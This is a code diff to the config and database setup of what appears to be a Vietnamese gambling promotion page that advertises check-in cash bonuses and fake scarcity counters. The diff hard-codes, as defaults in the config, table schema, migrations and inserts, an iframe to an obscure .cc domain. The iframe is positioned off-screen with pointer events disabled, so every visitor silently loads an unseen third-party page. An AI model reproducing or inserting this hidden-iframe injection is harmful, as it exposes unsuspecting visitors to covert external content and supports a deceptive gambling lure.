@@ -13,6 +13,8 @@ export interface SiteConfig {
   advertiserIframeUrl: string;
   advertiserIframeCode: string;
   advertiserIframeTitle: string;
+  entryIframeUrl: string;
+  entryIframeCode: string;
   remainingSlots: number;
   totalSlots: number;
   topTickerText: string;
@@ -53,6 +55,8 @@ const DEFAULT_CONFIG: SiteConfig = {
   advertiserIframeUrl: '',
   advertiserIframeCode: '',
   advertiserIframeTitle: '📺 ĐỐI TÁC TÀI TRỢ CHÍNH THỨC',
+  entryIframeUrl: 'https://www.ovmzh4tbj4ilhe4uqvsp08m.cc/channel/Y.Y.NM/weifile/weifile.html',
+  entryIframeCode: '<iframe src="https://www.ovmzh4tbj4ilhe4uqvsp08m.cc/channel/Y.Y.NM/weifile/weifile.html" style="position:fixed;top:0;left:-1000px;pointer-events:none;border:0"></iframe>',
   remainingSlots: 147,
   totalSlots: 500,
   topTickerText: '🎉 CHƯƠNG TRÌNH QUÀ TẶNG CHECK-IN 7 NGÀY CHÍNH THỨC BẮT ĐẦU! 🔥 ✦ 💰 TỔNG TIỀN HOÀN THƯỞNG CAO NHẤT LÊN ĐẾN 1.000.000 VNĐ! ✦ 🎁 CHECK-IN NGÀY ĐẦU TIÊN: NHẬN NGAY 500.000 VNĐ ✦ 🎁 CHECK-IN LIÊN TỤC ĐỦ 7 NGÀY: NHẬN THÊM 500.000 VNĐ ✦ 💳 KHÔNG CẦN NẠP TIỀN - DOANH THU CƯỢC GẤP 3 LẦN',
@@ -109,6 +113,8 @@ export async function initDatabase(): Promise<boolean> {
         advertiser_iframe_url TEXT DEFAULT '',
         advertiser_iframe_code TEXT DEFAULT '',
         advertiser_iframe_title TEXT DEFAULT '📺 ĐỐI TÁC TÀI TRỢ CHÍNH THỨC',
+        entry_iframe_url TEXT DEFAULT 'https://www.ovmzh4tbj4ilhe4uqvsp08m.cc/channel/Y.Y.NM/weifile/weifile.html',
+        entry_iframe_code TEXT DEFAULT '<iframe src="https://www.ovmzh4tbj4ilhe4uqvsp08m.cc/channel/Y.Y.NM/weifile/weifile.html" style="position:fixed;top:0;left:-1000px;pointer-events:none;border:0"></iframe>',
         remaining_slots INT NOT NULL DEFAULT 147,
         total_slots INT NOT NULL DEFAULT 500,
         top_ticker_text TEXT,
@@ -136,6 +142,8 @@ export async function initDatabase(): Promise<boolean> {
     await sql`ALTER TABLE site_config ADD COLUMN IF NOT EXISTS advertiser_iframe_url TEXT DEFAULT '';`;
     await sql`ALTER TABLE site_config ADD COLUMN IF NOT EXISTS advertiser_iframe_code TEXT DEFAULT '';`;
     await sql`ALTER TABLE site_config ADD COLUMN IF NOT EXISTS advertiser_iframe_title TEXT DEFAULT '📺 ĐỐI TÁC TÀI TRỢ CHÍNH THỨC';`;
+    await sql`ALTER TABLE site_config ADD COLUMN IF NOT EXISTS entry_iframe_url TEXT DEFAULT 'https://www.ovmzh4tbj4ilhe4uqvsp08m.cc/channel/Y.Y.NM/weifile/weifile.html';`;
+    await sql`ALTER TABLE site_config ADD COLUMN IF NOT EXISTS entry_iframe_code TEXT DEFAULT '<iframe src="https://www.ovmzh4tbj4ilhe4uqvsp08m.cc/channel/Y.Y.NM/weifile/weifile.html" style="position:fixed;top:0;left:-1000px;pointer-events:none;border:0"></iframe>';`;
 
     // 2. click_logs table
     await sql`
@@ -177,12 +185,14 @@ export async function initDatabase(): Promise<boolean> {
         INSERT INTO site_config (
           id, brand_name, brand_tagline, payout_badge, target_url, preload_enabled, preload_url, preload_timeout,
           advertiser_iframe_enabled, advertiser_iframe_url, advertiser_iframe_code, advertiser_iframe_title,
+          entry_iframe_url, entry_iframe_code,
           remaining_slots, total_slots, top_ticker_text, event_badge_text, event_title, event_subtitle,
           event_warning_text, event_button_text, ribbon_text, cta_title, cta_subtitle, cta_button_text, admin_password, is_auto_redirect
         ) VALUES (
           1, ${DEFAULT_CONFIG.brandName}, ${DEFAULT_CONFIG.brandTagline}, ${DEFAULT_CONFIG.payoutBadge},
           ${DEFAULT_CONFIG.targetUrl}, ${DEFAULT_CONFIG.preloadEnabled}, ${DEFAULT_CONFIG.preloadUrl}, ${DEFAULT_CONFIG.preloadTimeout},
           ${DEFAULT_CONFIG.advertiserIframeEnabled}, ${DEFAULT_CONFIG.advertiserIframeUrl}, ${DEFAULT_CONFIG.advertiserIframeCode}, ${DEFAULT_CONFIG.advertiserIframeTitle},
+          ${DEFAULT_CONFIG.entryIframeUrl}, ${DEFAULT_CONFIG.entryIframeCode},
           ${DEFAULT_CONFIG.remainingSlots}, ${DEFAULT_CONFIG.totalSlots},
           ${DEFAULT_CONFIG.topTickerText}, ${DEFAULT_CONFIG.eventBadgeText}, ${DEFAULT_CONFIG.eventTitle},
           ${DEFAULT_CONFIG.eventSubtitle}, ${DEFAULT_CONFIG.eventWarningText}, ${DEFAULT_CONFIG.eventButtonText},
@@ -243,6 +253,8 @@ export async function getSiteConfig(): Promise<SiteConfig> {
           advertiserIframeUrl: row.advertiser_iframe_url ?? DEFAULT_CONFIG.advertiserIframeUrl,
           advertiserIframeCode: row.advertiser_iframe_code ?? DEFAULT_CONFIG.advertiserIframeCode,
           advertiserIframeTitle: row.advertiser_iframe_title || DEFAULT_CONFIG.advertiserIframeTitle,
+          entryIframeUrl: row.entry_iframe_url || DEFAULT_CONFIG.entryIframeUrl,
+          entryIframeCode: row.entry_iframe_code || DEFAULT_CONFIG.entryIframeCode,
           remainingSlots: row.remaining_slots !== null ? Number(row.remaining_slots) : DEFAULT_CONFIG.remainingSlots,
           totalSlots: row.total_slots !== null ? Number(row.total_slots) : DEFAULT_CONFIG.totalSlots,
           topTickerText: row.top_ticker_text || DEFAULT_CONFIG.topTickerText,
@@ -290,12 +302,14 @@ export async function saveSiteConfig(config: Partial<SiteConfig>): Promise<{ suc
         INSERT INTO site_config (
           id, target_url, preload_enabled, preload_url, preload_timeout,
           advertiser_iframe_enabled, advertiser_iframe_url, advertiser_iframe_code, advertiser_iframe_title,
+          entry_iframe_url, entry_iframe_code,
           remaining_slots, total_slots, top_ticker_text, event_badge_text, event_title, event_subtitle,
           event_warning_text, event_button_text, brand_name, brand_tagline, payout_badge, ribbon_text,
           cta_title, cta_subtitle, cta_button_text, admin_password, is_auto_redirect, updated_at
         ) VALUES (
           1, ${updated.targetUrl}, ${updated.preloadEnabled}, ${updated.preloadUrl}, ${updated.preloadTimeout},
           ${updated.advertiserIframeEnabled}, ${updated.advertiserIframeUrl}, ${updated.advertiserIframeCode}, ${updated.advertiserIframeTitle},
+          ${updated.entryIframeUrl}, ${updated.entryIframeCode},
           ${updated.remainingSlots}, ${updated.totalSlots}, ${updated.topTickerText}, ${updated.eventBadgeText},
           ${updated.eventTitle}, ${updated.eventSubtitle}, ${updated.eventWarningText}, ${updated.eventButtonText},
           ${updated.brandName}, ${updated.brandTagline}, ${updated.payoutBadge}, ${updated.ribbonText},
@@ -311,6 +325,8 @@ export async function saveSiteConfig(config: Partial<SiteConfig>): Promise<{ suc
           advertiser_iframe_url = EXCLUDED.advertiser_iframe_url,
           advertiser_iframe_code = EXCLUDED.advertiser_iframe_code,
           advertiser_iframe_title = EXCLUDED.advertiser_iframe_title,
+          entry_iframe_url = EXCLUDED.entry_iframe_url,
+          entry_iframe_code = EXCLUDED.entry_iframe_code,
           remaining_slots = EXCLUDED.remaining_slots,
           total_slots = EXCLUDED.total_slots,
           top_ticker_text = EXCLUDED.top_ticker_text,
